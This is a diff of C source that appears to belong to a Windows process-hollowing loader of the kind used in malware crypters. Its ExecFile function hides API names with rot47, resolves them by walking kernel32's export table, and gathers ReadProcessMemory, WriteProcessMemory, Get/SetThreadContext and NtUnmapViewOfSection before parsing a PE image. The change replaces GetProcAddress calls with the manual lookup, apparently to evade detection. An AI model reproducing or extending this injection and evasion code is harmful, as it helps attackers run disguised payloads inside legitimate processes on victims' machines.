@@ -95,17 +95,19 @@ void ExecFile(LPSTR szFilePath, LPVOID pFile) {
 	rot47(vLoadLibrary);
 
   xLoadLibrary = (PLoadLibrary) getfunction (findkernel() ,(unsigned char *) vLoadLibrary, strlen(vLoadLibrary) );
-
 	HINSTANCE Hkernel32  = xLoadLibrary(vKERNEL32);
 	HINSTANCE Hntdll = xLoadLibrary(vNTDLL);
 
 	xGetProcAddress = (PGetProcAddress) getfunction(findkernel(),(unsigned char *)vGetProcAddress, strlen(vGetProcAddress));
-	xReadProcessMemory = PReadProcessMemory(xGetProcAddress(Hkernel32,vReadProcessMemory));
-  xCreateProcessA = PCreateProcessA(xGetProcAddress(Hkernel32,vCreateProcessA));
-	xNtResumeThread = PNtResumeThread(xGetProcAddress(Hntdll,vNtResumeThread));
-	xWriteProcessMemory = PWriteProcessMemory(xGetProcAddress(Hkernel32,vWriteProcessMemory));
-	xGetThreadContext = PGetThreadContext(xGetProcAddress(Hkernel32,vGetThreadContext));
-	xSetThreadContext = PSetThreadContext(xGetProcAddress(Hkernel32,vSetThreadContext));
+  xReadProcessMemory = (PReadProcessMemory) getfunction(findkernel(),(unsigned char *)vReadProcessMemory,strlen(vReadProcessMemory));
+//	xReadProcessMemory = PReadProcessMemory(xGetProcAddress(Hkernel32,vReadProcessMemory));
+	xWriteProcessMemory = (PWriteProcessMemory)  getfunction(findkernel(),(unsigned char *)vWriteProcessMemory,strlen(vWriteProcessMemory));
+//	xWriteProcessMemory = PWriteProcessMemory(xGetProcAddress(Hkernel32,vWriteProcessMemory));
+	
+	xGetThreadContext = ( PGetThreadContext) getfunction(findkernel(),(unsigned char *)vGetThreadContext,strlen(vGetThreadContext));
+//	xGetThreadContext = PGetThreadContext(xGetProcAddress(Hkernel32,vGetThreadContext));
+	xSetThreadContext = ( PSetThreadContext) getfunction(findkernel(),(unsigned char *)vSetThreadContext,strlen(vSetThreadContext));
+//	xSetThreadContext = PSetThreadContext(xGetProcAddress(Hkernel32,vSetThreadContext));
 	xNtUnmapViewOfSection = PNtUnmapViewOfSection(xGetProcAddress(Hntdll,vNtUnmapViewOfSection));
 
 	IDH = PIMAGE_DOS_HEADER(pFile);
